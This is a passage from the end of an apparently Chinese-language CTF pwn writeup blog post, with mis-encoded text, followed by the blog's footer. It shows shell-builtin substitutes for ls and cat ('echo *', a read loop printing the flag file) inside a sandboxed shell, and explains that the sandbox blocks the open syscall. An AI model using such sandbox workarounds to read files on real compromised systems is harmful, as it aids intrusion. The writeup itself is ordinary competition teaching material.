<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/12.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  

<p>ÂèØÊòØËøô‰∏™ <code>shell</code> Âπ∂‰∏çËÉΩ‰ΩøÁî® <code>ls„ÄÅcat</code> Ëøô‰∫õÊåá‰ª§ÔºåÂè™ËÉΩ‰ΩøÁî® <code>cd„ÄÅpwd„ÄÅecho</code> ËøôÁßçÊØîËæÉÂü∫Êú¨ÁöÑÔºåËÄå‰∏î <code>echo</code> ÁöÑÂäüËÉΩËøò‰∏çÂÖ®Ôºå‰∏ãÈù¢ÁªôÂá∫‰∏Ä‰∫õÂèØ‰ª•Áî®Êù•Âπ≥ÊõøÁöÑËÑöÊú¨Ôºö</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br></pre></td></tr></table></figure>
<p>ÊïàÊûúÂ¶Ç‰∏ãÔºö</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/13.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  

<p>ÈÇ£‰∏∫‰ªÄ‰πà <code>ls„ÄÅcat</code> Á≠âÊåá‰ª§Êó†Ê≥ï‰ΩøÁî®Âë¢ÔºüËøôÈáå‰ª• <code>ls</code> ‰∏∫‰æãËß£Èáä‰∏Ä‰∏ãÔºö<br>lsÂëΩ‰ª§ÁöÑÂÆûÁé∞ÂèØ‰ª•ÂàÜ‰∏∫‰ª•‰∏ãÂá†‰∏™Ê≠•È™§Ôºö  </p>
<ol>
<li><p>ÊâìÂºÄÁõÆÂΩïÔºöÈ¶ñÂÖàÔºåÈúÄË¶ÅÊâìÂºÄË¶ÅÂàóÂá∫Êñá‰ª∂ÁöÑÁõÆÂΩï„ÄÇÂèØ‰ª•‰ΩøÁî® <code>open()</code> Á≥ªÁªüË∞ÉÁî®Êù•ÊâìÂºÄÁõÆÂΩïÔºåÂπ∂Ëé∑Âæó‰∏Ä‰∏™ÁõÆÂΩïÊñá‰ª∂ÊèèËø∞Á¨¶„ÄÇ  </p>
</li>
<li><p>ËØªÂèñÁõÆÂΩïÈ°πÔºöÈÄöËøá <code>readdir()</code> Á≥ªÁªüË∞ÉÁî®ÔºåÂèØ‰ª•‰ªéÊâìÂºÄÁöÑÁõÆÂΩï‰∏≠ËØªÂèñÁõÆÂΩïÈ°π„ÄÇ<code>readdir()</code> ‰ºöËøîÂõû‰∏Ä‰∏™ÊåáÂêëÁõÆÂΩïÈ°πÁªìÊûÑ‰ΩìÁöÑÊåáÈíà„ÄÇÈÄöËøáÂæ™ÁéØË∞ÉÁî® <code>readdir()</code>ÔºåÂèØ‰ª•ÈÄê‰∏™ËØªÂèñÁõÆÂΩï‰∏≠ÁöÑÊñá‰ª∂„ÄÇ  </p>
</li>
<li><p>ËøáÊª§ÈöêËóèÊñá‰ª∂ÔºöÂú®ËØªÂèñÁõÆÂΩïÈ°π‰πãÂêéÔºåÈúÄË¶ÅÂØπÁõÆÂΩïÈ°πËøõË°åËøáÊª§„ÄÇLinux‰∏≠ÁöÑÈöêËóèÊñá‰ª∂‰ª•.ÂºÄÂ§¥ÔºåÂèØ‰ª•ÈÄöËøáÂà§Êñ≠ÁõÆÂΩïÈ°πÁöÑÂêçÂ≠óÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÊòØÂê¶‰∏∫.Êù•ËøáÊª§ÈöêËóèÊñá‰ª∂„ÄÇ  </p>
</li>
<li><p>ËæìÂá∫ÁõÆÂΩïÈ°π‰ø°ÊÅØÔºöËØªÂèñÂà∞‰∏Ä‰∏™ÁõÆÂΩïÈ°π‰πãÂêéÔºåÂèØ‰ª•ÈÄöËøáÁõÆÂΩïÈ°πÁªìÊûÑ‰Ωì‰∏≠ÁöÑÂ≠óÊÆµËé∑ÂèñÊñá‰ª∂ÁöÑÂ±ûÊÄß‰ø°ÊÅØÔºåÊØîÂ¶ÇÊñá‰ª∂Âêç„ÄÅÂ§ßÂ∞è„ÄÅ‰øÆÊîπÊó∂Èó¥Á≠â„ÄÇÂèØ‰ª•‰ΩøÁî® <code>printf()</code> ÂáΩÊï∞Â∞ÜËøô‰∫õ‰ø°ÊÅØËæìÂá∫Âà∞ÁªàÁ´Ø„ÄÇ  </p>
</li>
<li><p>ÂÖ≥Èó≠ÁõÆÂΩïÔºö‰ΩøÁî® <code>closedir()</code> Á≥ªÁªüË∞ÉÁî®Êù•ÂÖ≥Èó≠ÊâìÂºÄÁöÑÁõÆÂΩïÔºåÈáäÊîæËµÑÊ∫ê„ÄÇ</p>
</li>
</ol>
<p>ÂèØ‰ª•ÁúãÂà∞ÊâßË°å <code>ls</code> ÂëΩ‰ª§ÈúÄË¶Å‰ΩøÁî® <code>open</code> Á≥ªÁªüË∞ÉÁî®ÔºåÂèØÊòØÊàë‰ª¨ÊãøÂà∞ÁöÑ <code>shell</code> ‰æùÁÑ∂Â§Ñ‰∫éÊ≤ôÁÆ±ÁöÑÁéØÂ¢É‰∏≠Ôºå<code>open</code> Á≥ªÁªüË∞ÉÁî®ÁªôÁ¶ÅÊ≠¢‰ΩøÁî®ÔºåËøô‰πüÊÑèÂë≥ÁùÄÊàë‰ª¨Êó†Ê≥ï‰ΩøÁî® <code>ls</code> ÂëΩ‰ª§</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pstack"><span class="toc-number">1.</span> <span class="toc-text">pstack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TravelGraph"><span class="toc-number">2.</span> <span class="toc-text">TravelGraph</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httpd"><span class="toc-number">3.</span> <span class="toc-text">httpd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logger"><span class="toc-number">4.</span> <span class="toc-text">logger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sandbox-after-competition"><span class="toc-number">5.</span> <span class="toc-text">sandbox(after competition)</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&text=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&is_video=false&description=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ÁæäÂüéÊùØ 2024 pwn writeup&body=Check out this article: https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&name=ÁæäÂüéÊùØ 2024 pwn writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&t=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">friends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
